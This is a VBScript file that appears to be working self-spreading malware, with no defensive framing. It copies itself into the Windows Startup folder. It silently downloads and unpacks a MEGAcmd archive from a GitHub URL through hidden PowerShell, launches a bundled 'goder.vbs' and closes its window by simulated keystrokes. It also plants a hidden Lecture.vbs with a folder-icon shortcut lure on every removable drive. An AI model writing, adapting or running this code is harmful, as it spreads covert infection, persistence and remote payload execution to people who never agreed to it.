Option Explicit
On Error Resume Next ' Ignore errors

' Initialize objects
Dim objFSO, objShell
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Copy the script to startup folder if not present
Dim startupFolderPath, selfScriptPath, selfScriptName
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)
objFSO.CopyFile selfScriptPath, startupFolderPath & "\" & selfScriptName, True

Do
    ' Create C:\Mega folder if not present
    Dim megaFolderPath
    megaFolderPath = "C:\Mega"
    If Not objFSO.FolderExists(megaFolderPath) Then
        objFSO.CreateFolder(megaFolderPath)
    End If

    ' Download MEGAcmd zip file if not present
    Dim zipFilePath, url, MegacmdPath
    MegacmdPath = megaFolderPath & "\MEGAcmd"
    zipFilePath = megaFolderPath & "\MEGAcmd.zip"
    url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"
    If Not objFSO.FolderExists(MegacmdPath) Then
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000 ' Wait for 1 second
        Loop
        Dim objShellApp, objSource, objTarget
        Set objShellApp = CreateObject("Shell.Application")
        Set objSource = objShellApp.Namespace(zipFilePath).Items
        Set objTarget = objShellApp.Namespace(megaFolderPath)

        ' Suppress progress dialogs while copying files
        objTarget.CopyHere objSource, 16 ' Suppress progress dialogs

        ' Wait until all files are copied
        Do While objTarget.Items.Count < objSource.Count
            WScript.Sleep 1000 ' Wait for 1 second
        Loop

        If objFSO.FileExists(zipFilePath) Then
            objFSO.DeleteFile(zipFilePath)
        End If
    End If

    ' Run goder.vbs if less than 5 WScript processes are running
    Dim objExec, wscriptCount
    Set objExec = objShell.Exec("tasklist /FI ""IMAGENAME eq wscript.exe"" /fo list /nh")
    wscriptCount = objExec.StdOut.ReadAll()
    If Len(wscriptCount) < 5 Then
        objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && goder.vbs > nul 2>&1", 0, False
        WScript.Sleep 1000 ' Adjust delay as needed
        objShell.AppActivate "Command Prompt"
        objShell.SendKeys "%{F4}" ' Send ALT + F4 to close the window
    End If
    
    ' Check for removable drives and set up Lecture.vbs
    Dim driveLetter, removableDrivePath, lectureOnDrivePath, shortcutPath
    For Each drive In objFSO.Drives
        If drive.DriveType = 1 Then ' DriveType 1 represents removable drive
            driveLetter = drive.Path
            removableDrivePath = driveLetter & "\"
            lectureOnDrivePath = removableDrivePath & "Lecture.vbs"
            shortcutPath = removableDrivePath & "Lecture.lnk"
            If Not objFSO.FileExists(lectureOnDrivePath) Then
                Dim lectureInStartupPath
                lectureInStartupPath = startupFolderPath & "\Lecture.vbs"
                objFSO.CopyFile lectureInStartupPath, lectureOnDrivePath
                Dim objLink
                Set objLink = objShell.CreateShortcut(shortcutPath)
                objLink.TargetPath = lectureOnDrivePath
                objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
                objLink.Save
                objShell.Run "cmd /c attrib +h """ & lectureOnDrivePath & """", 0, True
            End If
        End If
    Next
    
    ' Pause for 5 seconds before next iteration
    WScript.Sleep 5000
Loop
